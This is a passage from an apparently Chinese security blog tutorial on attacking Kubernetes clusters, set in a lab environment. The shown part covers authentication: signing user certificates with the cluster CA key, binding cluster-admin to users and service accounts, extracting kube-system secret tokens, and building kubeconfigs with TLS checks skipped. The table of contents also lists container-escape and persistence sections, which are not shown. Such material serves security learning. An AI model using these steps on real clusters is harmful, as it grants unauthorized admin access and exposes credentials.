8.05 19.15 8.03L19.15 8.03L19.15 8.03Q19.17 8.00 19.21 7.98L19.21 7.98L19.21 7.98Q19.28 7.96 19.41 7.96L19.41 7.96L19.41 7.96Q19.54 7.96 19.61 7.93L19.61 7.93L19.61 7.93Q19.70 7.91 19.73 7.93L19.73 7.93L19.73 7.93Q19.76 7.95 19.82 8.01L19.82 8.01L19.82 8.01Q19.84 8.04 19.85 8.03L19.85 8.03L19.85 8.03Q19.85 8.03 19.85 8.00L19.85 8.00L19.85 8.00Q19.85 7.98 19.86 7.96L19.86 7.96L19.86 7.96Q19.87 7.94 19.89 7.93L19.89 7.93L19.89 7.93Q19.95 7.91 19.98 7.90L19.98 7.90L19.98 7.90Q20.02 7.90 20.04 7.83L20.04 7.83L20.04 7.83Q20.05 7.76 20.06 7.76L20.06 7.76L20.06 7.76Q20.07 7.77 20.15 7.83L20.15 7.83L20.15 7.83Q20.17 7.87 20.32 8.07L20.32 8.07L20.32 8.07Q20.47 8.27 20.69 8.58L20.69 8.58L20.69 8.58Q20.90 8.88 21.13 9.24L21.13 9.24L21.13 9.24Q21.37 9.60 21.57 9.95L21.57 9.95L21.57 9.95Q21.78 9.67 22.03 9.32L22.03 9.32L22.03 9.32Q22.29 8.98 22.53 8.66L22.53 8.66L22.53 8.66Q22.77 8.35 22.98 8.12L22.98 8.12L22.98 8.12Q23.18 7.89 23.28 7.83L23.28 7.83L23.28 7.83Q23.36 7.79 23.39 7.77L23.39 7.77L23.39 7.77Q23.43 7.76 23.45 7.76L23.45 7.76L23.45 7.76Q23.48 7.76 23.52 7.80L23.52 7.80L23.52 7.80Q23.58 7.83 23.64 7.85L23.64 7.85L23.64 7.85Q23.70 7.87 23.74 7.93L23.74 7.93L23.74 7.93Q23.80 7.99 23.80 8.06L23.80 8.06L23.80 8.06Q23.81 8.12 23.79 8.20L23.79 8.20L23.79 8.20Q23.78 8.23 23.67 8.39L23.67 8.39L23.67 8.39Q23.56 8.56 23.34 8.85L23.34 8.85L23.34 8.85Q23.12 9.15 22.77 9.57L22.77 9.57L22.77 9.57Q22.43 10.00 21.94 10.58L21.94 10.58L21.94 10.58Q22.07 10.81 22.24 11.08L22.24 11.08L22.24 11.08Q22.42 11.35 22.60 11.61L22.60 11.61L22.60 11.61Q22.78 11.87 22.95 12.12L22.95 12.12L22.95 12.12Q23.12 12.36 23.26 12.55L23.26 12.55L23.26 12.55Q23.41 12.75 23.51 12.88L23.51 12.88L23.51 12.88Q23.60 13.01 23.63 13.04ZM29.19 11.40L29.19 11.40L29.19 11.40Q29.19 11.79 29.02 12.20L29.02 12.20L29.02 12.20Q28.85 12.60 28.54 12.93L28.54 12.93L28.54 12.93Q28.23 13.26 27.78 13.47L27.78 13.47L27.78 13.47Q27.34 13.69 26.78 13.69L26.78 13.69L26.78 13.69Q26.33 13.69 25.87 13.49L25.87 13.49L25.87 13.49Q25.41 13.30 25.04 12.94L25.04 12.94L25.04 12.94Q24.67 12.58 24.44 12.07L24.44 12.07L24.44 12.07Q24.21 11.56 24.21 10.92L24.21 10.92L24.21 10.92Q24.21 10.29 24.45 9.73L24.45 9.73L24.45 9.73Q24.69 9.17 25.09 8.75L25.09 8.75L25.09 8.75Q25.48 8.33 25.99 8.08L25.99 8.08L25.99 8.08Q26.50 7.83 27.04 7.83L27.04 7.83L27.04 7.83Q27.54 7.83 27.89 7.97L27.89 7.97L27.89 7.97Q28.23 8.10 28.44 8.28L28.44 8.28L28.44 8.28Q28.66 8.46 28.75 8.65L28.75 8.65L28.75 8.65Q28.84 8.85 28.84 8.96L28.84 8.96L28.84 8.96Q28.84 9.22 28.73 9.39L28.73 9.39L28.73 9.39Q28.62 9.55 28.48 9.63L28.48 9.63L28.48 9.63Q28.34 9.71 28.22 9.72L28.22 9.72L28.22 9.72Q28.09 9.73 28.05 9.68L28.05 9.68L28.05 9.68Q28.03 9.65 28.00 9.65L28.00 9.65L28.00 9.65Q27.97 9.65 27.93 9.67L27.93 9.67L27.93 9.67Q27.90 9.68 27.87 9.69L27.87 9.69L27.87 9.69Q27.84 9.71 27.82 9.69L27.82 9.69L27.82 9.69Q27.78 9.68 27.81 9.63L27.81 9.63L27.81 9.63Q27.84 9.58 27.84 9.55L27.84 9.55L27.84 9.55Q27.84 9.49 27.84 9.41L27.84 9.41L27.84 9.41Q27.84 9.33 27.87 9.24L27.87 9.24L27.87 9.24Q27.93 9.12 27.92 8.97L27.92 8.97L27.92 8.97Q27.91 8.83 27.82 8.70L27.82 8.70L27.82 8.70Q27.73 8.57 27.53 8.48L27.53 8.48L27.53 8.48Q27.34 8.39 27.03 8.39L27.03 8.39L27.03 8.39Q26.81 8.39 26.51 8.53L26.51 8.53L26.51 8.53Q26.21 8.67 25.94 8.98L25.94 8.98L25.94 8.98Q25.67 9.28 25.48 9.75L25.48 9.75L25.48 9.75Q25.29 10.22 25.29 10.87L25.29 10.87L25.29 10.87Q25.29 11.15 25.36 11.46L25.36 11.46L25.36 11.46Q25.44 11.76 25.62 12.02L25.62 12.02L25.62 12.02Q25.81 12.28 26.12 12.45L26.12 12.45L26.12 12.45Q26.43 12.62 26.92 12.62L26.92 12.62L26.92 12.62Q27.24 12.62 27.51 12.53L27.51 12.53L27.51 12.53Q27.78 12.44 28 12.30L28 12.30L28 12.30Q28.22 12.17 28.39 12.00L28.39 12.00L28.39 12.00Q28.56 11.84 28.68 11.69L28.68 11.69L28.68 11.69Q28.79 11.55 28.86 11.44L28.86 11.44L28.86 11.44Q28.92 11.33 28.94 11.30L28.94 11.30L28.94 11.30Q28.96 11.27 29.00 11.25L29.00 11.25L29.00 11.25Q29.05 11.23 29.09 11.24L29.09 11.24L29.09 11.24Q29.13 11.25 29.16 11.29L29.16 11.29L29.16 11.29Q29.19 11.33 29.19 11.40ZM32.44 13.19L32.44 13.19L32.44 13.19Q32.85 13.19 33.25 13.27L33.25 13.27L33.25 13.27Q33.66 13.34 33.99 13.52L33.99 13.52L33.99 13.52Q34.32 13.70 34.52 13.99L34.52 13.99L34.52 13.99Q34.72 14.28 34.72 14.72L34.72 14.72L34.72 14.72Q34.72 15.04 34.57 15.37L34.57 15.37L34.57 15.37Q34.42 15.70 34.15 16.00L34.15 16.00L34.15 16.00Q33.89 16.31 33.53 16.58L33.53 16.58L33.53 16.58Q33.17 16.86 32.75 17.06L32.75 17.06L32.75 17.06Q32.33 17.26 31.88 17.38L31.88 17.38L31.88 17.38Q31.43 17.49 30.98 17.49L30.98 17.49L30.98 17.49Q30.61 17.49 30.29 17.41L30.29 17.41L30.29 17.41Q29.96 17.34 29.72 17.18L29.72 17.18L29.72 17.18Q29.48 17.02 29.33 16.79L29.33 16.79L29.33 16.79Q29.19 16.55 29.19 16.23L29.19 16.23L29.19 16.23Q29.19 15.91 29.31 15.64L29.31 15.64L29.31 15.64Q29.44 15.36 29.64 15.13L29.64 15.13L29.64 15.13Q29.84 14.90 30.10 14.71L30.10 14.71L30.10 14.71Q30.36 14.52 30.64 14.39L30.64 14.39L30.64 14.39Q30.91 14.27 31.18 14.20L31.18 14.20L31.18 14.20Q31.45 14.13 31.66 14.13L31.66 14.13L31.66 14.13Q31.78 14.14 31.82 14.16L31.82 14.16L31.82 14.16Q31.86 14.18 31.86 14.20L31.86 14.20L31.86 14.20Q31.86 14.22 31.84 14.25L31.84 14.25L31.84 14.25Q31.82 14.28 31.82 14.30L31.82 14.30L31.82 14.30Q31.83 14.34 31.85 14.40L31.85 14.40L31.85 14.40Q31.86 14.45 31.86 14.51L31.86 14.51L31.86 14.51Q31.86 14.57 31.84 14.63L31.84 14.63L31.84 14.63Q31.81 14.68 31.74 14.69L31.74 14.69L31.74 14.69Q31.45 14.76 31.11 14.92L31.11 14.92L31.11 14.92Q30.76 15.09 30.46 15.31L30.46 15.31L30.46 15.31Q30.15 15.53 29.95 15.79L29.95 15.79L29.95 15.79Q29.74 16.04 29.74 16.30L29.74 16.30L29.74 16.30Q29.74 16.43 29.85 16.48L29.85 16.48L29.85 16.48Q29.97 16.54 30.18 16.54L30.18 16.54L30.18 16.54Q30.44 16.54 30.80 16.46L30.80 16.46L30.80 16.46Q31.17 16.39 31.55 16.25L31.55 16.25L31.55 16.25Q31.94 16.11 32.32 15.90L32.32 15.90L32.32 15.90Q32.70 15.70 33.01 15.45L33.01 15.45L33.01 15.45Q33.31 15.20 33.50 14.90L33.50 14.90L33.50 14.90Q33.68 14.61 33.68 14.27L33.68 14.27L33.68 14.27Q33.68 14.11 33.62 14.02L33.62 14.02L33.62 14.02Q33.55 13.92 33.47 13.88L33.47 13.88L33.47 13.88Q33.38 13.83 33.29 13.82L33.29 13.82L33.29 13.82Q33.20 13.81 33.13 13.81L33.13 13.81L33.13 13.81Q32.65 13.81 32.14 13.87L32.14 13.87L32.14 13.87Q31.64 13.92 31.22 13.99L31.22 13.99L31.22 13.99Q30.81 14.05 30.54 14.11L30.54 14.11L30.54 14.11Q30.28 14.17 30.26 14.17L30.26 14.17L30.26 14.17Q30.11 14.17 29.99 14.11L29.99 14.11L29.99 14.11Q29.86 14.05 29.77 13.95L29.77 13.95L29.77 13.95Q29.68 13.86 29.63 13.73L29.63 13.73L29.63 13.73Q29.58 13.60 29.58 13.47L29.58 13.47L29.58 13.47Q29.58 13.37 29.70 13.18L29.70 13.18L29.70 13.18Q29.83 12.98 30.02 12.76L30.02 12.76L30.02 12.76Q30.22 12.53 30.48 12.31L30.48 12.31L30.48 12.31Q30.73 12.09 30.99 11.95L30.99 11.95L30.99 11.95Q30.76 11.83 30.58 11.65L30.58 11.65L30.58 11.65Q30.39 11.47 30.27 11.27L30.27 11.27L30.27 11.27Q30.14 11.06 30.07 10.83L30.07 10.83L30.07 10.83Q30.00 10.60 30.00 10.36L30.00 10.36L30.00 10.36Q30.00 9.90 30.13 9.54L30.13 9.54L30.13 9.54Q30.26 9.18 30.47 8.91L30.47 8.91L30.47 8.91Q30.69 8.65 30.95 8.47L30.95 8.47L30.95 8.47Q31.21 8.29 31.47 8.18L31.47 8.18L31.47 8.18Q31.73 8.07 31.96 8.03L31.96 8.03L31.96 8.03Q32.20 7.98 32.35 7.98L32.35 7.98L32.35 7.98Q32.43 7.98 32.48 7.99L32.48 7.99L32.48 7.99Q32.53 8.00 32.57 8.01L32.57 8.01L32.57 8.01Q32.74 7.74 32.97 7.43L32.97 7.43L32.97 7.43Q33.19 7.12 33.42 6.81L33.42 6.81L33.42 6.81Q33.66 6.51 33.90 6.23L33.90 6.23L33.90 6.23Q34.13 5.95 34.33 5.74L34.33 5.74L34.33 5.74Q34.52 5.52 34.66 5.40L34.66 5.40L34.66 5.40Q34.79 5.27 34.84 5.27L34.84 5.27L34.84 5.27Q34.90 5.27 34.99 5.35L34.99 5.35L34.99 5.35Q35.08 5.43 35.16 5.53L35.16 5.53L35.16 5.53Q35.25 5.63 35.30 5.72L35.30 5.72L35.30 5.72Q35.36 5.81 35.36 5.84L35.36 5.84L35.36 5.84Q35.36 5.88 35.33 5.91L35.33 5.91L35.33 5.91Q35.31 5.93 35.31 5.95L35.31 5.95L35.31 5.95Q35.31 5.99 35.35 6.01L35.35 6.01L35.35 6.01Q35.38 6.04 35.46 6.07L35.46 6.07L35.46 6.07Q35.47 6.08 35.48 6.08L35.48 6.08L35.48 6.08Q35.49 6.08 35.49 6.10L35.49 6.10L35.49 6.10Q35.49 6.13 35.40 6.19L35.40 6.19L35.40 6.19Q35.31 6.25 35.11 6.42L35.11 6.42L35.11 6.42Q34.91 6.58 34.60 6.86L34.60 6.86L34.60 6.86Q34.28 7.15 33.82 7.62L33.82 7.62L33.82 7.62Q33.71 7.72 33.60 7.88L33.60 7.88L33.60 7.88Q33.48 8.03 33.35 8.20L33.35 8.20L33.35 8.20Q33.52 8.29 33.71 8.45L33.71 8.45L33.71 8.45Q33.91 8.61 34.06 8.81L34.06 8.81L34.06 8.81Q34.21 9.02 34.31 9.29L34.31 9.29L34.31 9.29Q34.41 9.56 34.41 9.86L34.41 9.86L34.41 9.86Q34.41 10.52 34.19 10.96L34.19 10.96L34.19 10.96Q33.97 11.41 33.63 11.68L33.63 11.68L33.63 11.68Q33.28 11.95 32.85 12.07L32.85 12.07L32.85 12.07Q32.42 12.18 32.00 12.18L32.00 12.18L32.00 12.18Q31.90 12.18 31.80 12.17L31.80 12.17L31.80 12.17Q31.71 12.17 31.62 12.15L31.62 12.15L31.62 12.15Q31.47 12.26 31.27 12.41L31.27 12.41L31.27 12.41Q31.07 12.56 30.88 12.74L30.88 12.74L30.88 12.74Q30.69 12.91 30.53 13.10L30.53 13.10L30.53 13.10Q30.37 13.28 30.28 13.45L30.28 13.45L30.28 13.45Q30.56 13.44 30.81 13.40L30.81 13.40L30.81 13.40Q31.06 13.36 31.32 13.32L31.32 13.32L31.32 13.32Q31.58 13.27 31.85 13.23L31.85 13.23L31.85 13.23Q32.12 13.19 32.44 13.19ZM32.22 8.83L32.22 8.83L32.22 8.83Q32.22 8.69 32.38 8.36L32.38 8.36L32.38 8.36Q32.06 8.46 31.81 8.67L31.81 8.67L31.81 8.67Q31.55 8.87 31.38 9.13L31.38 9.13L31.38 9.13Q31.20 9.39 31.10 9.69L31.10 9.69L31.10 9.69Q31.01 9.99 31.01 10.28L31.01 10.28L31.01 10.28Q31.01 10.49 31.06 10.69L31.06 10.69L31.06 10.69Q31.11 10.88 31.22 11.04L31.22 11.04L31.22 11.04Q31.33 11.19 31.50 11.28L31.50 11.28L31.50 11.28Q31.68 11.38 31.93 11.38L31.93 11.38L31.93 11.38Q32.20 11.38 32.42 11.28L32.42 11.28L32.42 11.28Q32.63 11.18 32.80 11.02L32.80 11.02L32.80 11.02Q32.96 10.86 33.08 10.66L33.08 10.66L33.08 10.66Q33.19 10.46 33.26 10.26L33.26 10.26L33.26 10.26Q33.33 10.07 33.37 9.90L33.37 9.90L33.37 9.90Q33.40 9.73 33.40 9.63L33.40 9.63L33.40 9.63Q33.40 9.21 33.27 8.99L33.27 8.99L33.27 8.99Q33.13 8.76 32.96 8.64L32.96 8.64L32.96 8.64Q32.86 8.76 32.76 8.86L32.76 8.86L32.76 8.86Q32.66 8.97 32.55 9.08L32.55 9.08L32.55 9.08Q32.53 9.09 32.50 9.09L32.50 9.09L32.50 9.09Q32.48 9.09 32.47 9.07L32.47 9.07L32.47 9.07Q32.46 9.05 32.42 9.05L32.42 9.05L32.42 9.05Q32.40 9.05 32.38 9.07L32.38 9.07L32.38 9.07Q32.36 9.09 32.33 9.09L32.33 9.09L32.33 9.09Q32.28 9.09 32.25 9.04L32.25 9.04L32.25 9.04Q32.22 8.98 32.22 8.83Z"></path></g><!----><!----></svg></a>
        
    </div>

                    <nav class="nav">
    <ul class="menu" id="menu">
        
            
        
        
        
        
            
                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
                </li>
            
        
            
                
                    
                    
                
            
        
            
                
            
        
    </ul>
</nav>

                    
                </div>
            </div>
            
    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
    <label for="nav-toggle" class="nav-toggle"></label>
    <label for="nav-toggle" class="nav-curtain"></label>


        
    </header>




            
            
    <main class="main single" id="main">
    <div class="main-inner">

        

        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">

            <h1 class="post-title p-name">Kubernetes 实际利用与分析</h1>

            

            
                
            

            
                

<div class="post-meta">
    
        
        <time datetime="2022-11-29T16:22:59&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.11.29</time>
    
    
    
    
        
        
        
            
        
    
    
    
        
        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;16&nbsp;分钟</span>
    

   
    

    
    
</div>

            

            <nav class="contents">
  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
    <li><a id="contents:用户身份认证" href="#用户身份认证">用户身份认证</a>
      <ol>
        <li><a id="contents:创建高权限用户" href="#创建高权限用户">创建高权限用户</a></li>
        <li><a id="contents:创建服务账号" href="#创建服务账号">创建服务账号</a></li>
      </ol>
    </li>
    <li><a id="contents:资产发现" href="#资产发现">资产发现</a></li>
    <li><a id="contents:未授权访问" href="#未授权访问">未授权访问</a>
      <ol>
        <li><a id="contents:api-server-未授权访问" href="#api-server-未授权访问">API Server 未授权访问</a></li>
        <li><a id="contents:kubelet-未授权访问" href="#kubelet-未授权访问">kubelet 未授权访问</a></li>
        <li><a id="contents:etcd-未授权访问" href="#etcd-未授权访问">etcd 未授权访问</a></li>
        <li><a id="contents:docker-remote-api-未授权访问" href="#docker-remote-api-未授权访问">Docker Remote API 未授权访问</a></li>
      </ol>
    </li>
    <li><a id="contents:容器逃逸" href="#容器逃逸">容器逃逸</a>
      <ol>
        <li><a id="contents:容器内信息搜集" href="#容器内信息搜集">容器内信息搜集</a></li>
        <li><a id="contents:利用高权限服务账号" href="#利用高权限服务账号">利用高权限服务账号</a></li>
        <li><a id="contents:利用-lxcfs" href="#利用-lxcfs">利用 LXCFS</a></li>
        <li><a id="contents:利用特权容器" href="#利用特权容器">利用特权容器</a></li>
        <li><a id="contents:利用-dockersock" href="#利用-dockersock">利用 docker.sock</a></li>
        <li><a id="contents:利用-proc-目录的挂载" href="#利用-proc-目录的挂载">利用 /PROC 目录的挂载</a></li>
        <li><a id="contents:利用-sys_ptrace-权限" href="#利用-sys_ptrace-权限">利用 SYS_PTRACE 权限</a></li>
        <li><a id="contents:cve-提权" href="#cve-提权">CVE 提权</a></li>
      </ol>
    </li>
    <li><a id="contents:权限维持" href="#权限维持">权限维持</a></li>
    <li><a id="contents:参考" href="#参考">参考</a></li>
  </ol>
</nav><div class="post-body e-content">
                <p>本文测试环境基于前文 - <a href="https://myzxcg.com/2022/11/Kubernetes-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_blank" rel="noopener">Kubernetes 环境搭建与基础知识</a> 搭建的k8s集群：</p>
<ul>
<li>一个master节点：192.168.223.142</li>
<li>两个工作 节点：192.168.223.143、192.168.223.144</li>
</ul>
<blockquote>
<p>对k8s集群攻击的最终目的是获取cluster-admin权限的kubeconfig 和apiserver 所在master 节点的主机权限（类比拿下域管理员账号和域控）</p>
</blockquote>
<h2 id="用户身份认证"><a href="#用户身份认证" class="anchor-link">#</a><a href="#contents:用户身份认证" class="headings">用户身份认证</a></h2>
<p>前面介绍k8s Dashboard 的安装时，发现Dashboard 有两种登录方式：Token 登录和证书登录。前面是创建了一个高权限的服务账户，并通过Token 的方式登录。下面通过创建普通用户和服务用户的方式，来介绍如何进行k8s的认证。</p>
<h3 id="创建高权限用户"><a href="#创建高权限用户" class="anchor-link">#</a><a href="#contents:创建高权限用户" class="headings">创建高权限用户</a></h3>
<p><a href="https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/certificate-signing-requests/#normal-user" target="_blank" rel="noopener">申请证书的另一种方法</a></p>
<p>创建一个名为kim用户的证书：</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#需在master 节点执行，如果不在master 节点执行可参考上面的链接：申请证书的另一种方法</span>
</span></span><span class="line"><span class="cl"><span class="c1">#创建私钥</span>
</span></span><span class="line"><span class="cl">openssl genrsa -out kim.key <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="c1">#用此私钥创建一个csr(证书签名请求)文件</span>
</span></span><span class="line"><span class="cl">openssl req -new -key kim.key -subj <span class="s2">&#34;/CN=kim&#34;</span> -out kim.csr
</span></span><span class="line"><span class="cl"><span class="c1">#生成证书（需要用到k8s的私钥来签名证书）</span>
</span></span><span class="line"><span class="cl">openssl x509 -req -in kim.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out kim.crt -days <span class="m">365</span>
</span></span><span class="line"><span class="cl"><span class="c1">#为用户分配cluster-admin权限</span>
</span></span><span class="line"><span class="cl"><span class="c1">#-n namespace 用于指定对某个命名空间的权限，如果未指定命名空间，则代表分配此权限到所有命名空间</span>
</span></span><span class="line"><span class="cl">kubectl create clusterrolebinding kim-binding --clusterrole<span class="o">=</span>cluster-admin --user<span class="o">=</span>kim
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>获取代表kim 的证书及私钥到本地，然后创建kubeconfig 文件进行后续的认证：</p>
<p><em><strong>Tips：</strong></em> kubeconfig 主要由clusters、context、users 组成，可通过<code>kubectl config view</code>简单查看。下面的命令也都可以不添加<code>--kubeconfig</code> 参数，写入的内容会自动保存在<code>$HOME/.kube/config</code> 里，也可通过<code>KUBECONFIG</code>环境变量指定。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#向kubeconfig 写入证书信息</span>
</span></span><span class="line"><span class="cl">kubectl config set-credentials kim --client-certificate<span class="o">=</span>./kim.crt --client-key<span class="o">=</span>./kim.key --embed-certs<span class="o">=</span><span class="nb">true</span> --kubeconfig<span class="o">=</span>./kim.kubeconfig
</span></span><span class="line"><span class="cl"><span class="c1">#在配置文件中指定api server地址。cluster.local 这个值随意，但前后要统一</span>
</span></span><span class="line"><span class="cl">kubectl config set-cluster cluster.local --server<span class="o">=</span>https://192.168.223.142:6443/  --insecure-skip-tls-verify --kubeconfig<span class="o">=</span>./kim.kubeconfig
</span></span><span class="line"><span class="cl"><span class="c1">#在配置文件中，设置上下文，kubernetes-admin@cluster.local 值随意，但前后要统一</span>
</span></span><span class="line"><span class="cl">kubectl config set-context kim@cluster.local --cluster<span class="o">=</span>cluster.local --user<span class="o">=</span>kim --kubeconfig<span class="o">=</span>./kim.kubeconfig
</span></span><span class="line"><span class="cl"><span class="c1">#切换上下文</span>
</span></span><span class="line"><span class="cl">kubectl config use-context kim@cluster.local --kubeconfig<span class="o">=</span>./kim.kubeconfig
</span></span><span class="line"><span class="cl"><span class="c1">#之后可使用kim.kubeconfig进行正常的kubectl命名了</span>
</span></span><span class="line"><span class="cl">kubectl get pods --kubeconfig<span class="o">=</span>./kim.kubeconfig
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><em><strong>Tips：</strong></em> context中将访问一个集群的参数（集群名、用户名、命名空间等）进行分组，通过use-context来切换集群上下文，用以对多集群的访问。</p>
<p>从上面添加用户的流程可以看出，Kubernetes 并不保存用来代表普通用户账号的对象。使用证书进行认证时，用户的信息保存在本地配置文件中，客户端使用该配置文件进行认证。 **需要注意的是，用户的证书是k8s的私钥来签名的，并且必须为此用户添加相应的权限。**API Server校验证书后，仅检查此用户名所绑定的角色权限。</p>
<h3 id="创建服务账号"><a href="#创建服务账号" class="anchor-link">#</a><a href="#contents:创建服务账号" class="headings">创建服务账号</a></h3>
<p>服务账号是 Kubernetes API 所管理的用户，它们被绑定到特定的命名空间。服务账号与一组以 Secret 保存的凭据相关，这些凭据会被挂载到 Pod 中，从而允许集群内的进程访问 Kubernetes API。</p>
<p>创建服务账号，并生成Token：</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#创建服务账号</span>
</span></span><span class="line"><span class="cl">kubectl create serviceaccount kimservice
</span></span><span class="line"><span class="cl"><span class="c1">#给kimService 账号添加集群管理员权限</span>
</span></span><span class="line"><span class="cl">kubectl create clusterrolebinding kim-admin --clusterrole<span class="o">=</span>cluster-admin --serviceaccount<span class="o">=</span>default:kimservice
</span></span><span class="line"><span class="cl"><span class="c1">#获取服务令牌方式一（k8s高版本有效，这里测试的是1.25 版本）</span>
</span></span><span class="line"><span class="cl"><span class="c1">#创建服务账号令牌，可添加 --duration 10m 参数设置token有效时间</span>
</span></span><span class="line"><span class="cl">kubectl create token kimservice
</span></span><span class="line"><span class="cl"><span class="c1">#获取服务令牌方式二（k8s低版本有效，这里测试的是 1.23.0版本）</span>
</span></span><span class="line"><span class="cl"><span class="c1">#查看指定命名空间下的所有secret</span>
</span></span><span class="line"><span class="cl">kubectl get secret -n kube-system
</span></span><span class="line"><span class="cl"><span class="c1">#查询指定secret中的token</span>
</span></span><span class="line"><span class="cl">kubectl describe secret admin-user-token-8mcdk -n kube-system
</span></span><span class="line"><span class="cl"><span class="c1">#或直接一条命令查询admin-user用户的token</span>
</span></span><span class="line"><span class="cl">kubectl describe secrets -n kube-system <span class="k">$(</span>kubectl -n kube-system get secret <span class="p">|</span> awk <span class="s1">&#39;/admin-user/{print $1}&#39;</span><span class="k">)</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>本地生成kubeconfig文件，进行认证：</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#将token写入到文件</span>
</span></span><span class="line"><span class="cl">kubectl --kubeconfig<span class="o">=</span>./kimservice.conf config set-credentials kim-user --token<span class="o">=</span>eyJhbGciOiJSUzI1NiIsImtpZCI6I...
</span></span><span class="line"><span class="cl"><span class="c1">#在配置文件中指定api server地址。cluster.local 这个值随意，但前后要统一</span>
</span></span><span class="line"><span class="cl">kubectl config set-cluster cluster.local --server<span class="o">=</span>https://192.168.223.142:6443/  --insecure-skip-tls-verify --kubeconfig<span class="o">=</span>./kimservice.conf
</span></span><span class="line"><span class="cl"><span class="c1">#在配置文件中，设置上下文，kubernetes-admin@cluster.local 值随意，但前后要统一</span>
</span></span><span class="line"><span class="cl">kubectl config set-context kubernetes-admin@cluster.local --cluster<span class="o">=</span>cluster.local --user<span class="o">=</span>kimservice --kubeconfig<span class="o">=</span>./kimservice.conf
</span></span><span class="line"><span class="cl"><span class="c1">#切换上下文</span>
</span></span><span class="line"><span class="cl">kubectl config use-context kubernetes-admin@cluster.local --kubeconfig<span class="o">=</span>./kimservice.conf
</span></span><span class="line"><span class="cl"><span class="c1">#之后可使用kimservice.conf进行正常的kubectl命名了</span>
</span></span><span class="line"><span class="cl">kubectl get pods --kubeconfig<span class="o">=</span>./kimservice.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#或直接一条命令</span>
</span></span><span class="line"><span class="cl">kubectl --insecure-skip-tls-verify -s https://192.168.223.142:6443/ --token<span class="o">=</span><span class="s2">&#34;xxxxxx&#34;</span> get nodes
</span></span></code></pre></td></tr></table></div>
</div>
